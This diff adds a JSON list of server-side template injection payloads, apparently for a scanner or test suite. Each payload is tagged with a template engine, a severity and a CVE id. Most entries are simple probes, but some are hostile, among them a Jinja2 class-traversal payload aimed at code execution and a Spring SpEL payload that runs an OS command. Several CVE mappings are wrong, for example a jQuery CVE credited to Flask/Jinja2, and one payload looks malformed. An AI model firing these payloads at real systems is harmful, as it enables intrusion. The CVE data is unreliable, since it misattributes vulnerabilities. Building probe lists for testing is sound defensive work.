@@ -1,0 +1,66 @@
+[
+  {
+    "value": "{{7*7}}",
+    "description": "Generic SSTI probe - if rendered as 49, template engine is vulnerable",
+    "cveId": "CWE-94",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=template+injection",
+    "severity": "high",
+    "engine": "generic"
+  },
+  {
+    "value": "${7*7}",
+    "description": "Java/FreeMarker/Spring SSTI probe via ${} expression",
+    "cveId": "CVE-2021-25770",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25770",
+    "severity": "high",
+    "engine": "java"
+  },
+  {
+    "value": "#{7*7}",
+    "description": "Thymeleaf/Spring SSTI probe via #{} expression syntax",
+    "cveId": "CVE-2023-24163",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24163",
+    "severity": "high",
+    "engine": "thymeleaf"
+  },
+  {
+    "value": "{{config}}",
+    "description": "Flask/Jinja2 SSTI - reveals application configuration if vulnerable",
+    "cveId": "CVE-2019-11358",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11358",
+    "severity": "critical",
+    "engine": "jinja2"
+  },
+  {
+    "value": "{{''.__class__.__mro__[1].__subclasses__()}}",
+    "description": "Jinja2 Python class traversal via MRO - can lead to RCE",
+    "cveId": "CVE-2023-29483",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-29483",
+    "severity": "critical",
+    "engine": "jinja2"
+  },
+  {
+    "value": "<%= 7*7 %>",
+    "description": "ERB (Ruby on Rails) SSTI probe via <%= %> tag",
+    "cveId": "CVE-2022-27777",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-27777",
+    "severity": "high",
+    "engine": "erb"
+  },
+  {
+    "value": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "description": "Spring SpEL injection allowing OS command execution",
+    "cveId": "CVE-2022-22965",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965",
+    "severity": "critical",
+    "engine": "spel"
+  },
+  {
+    "value": "{{range.init(\"id\")}}",
+    "description": "Pebble/Java template injection probe",
+    "cveId": "CWE-94",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=template+injection",
+    "severity": "high",
+    "engine": "pebble"
+  }
+]
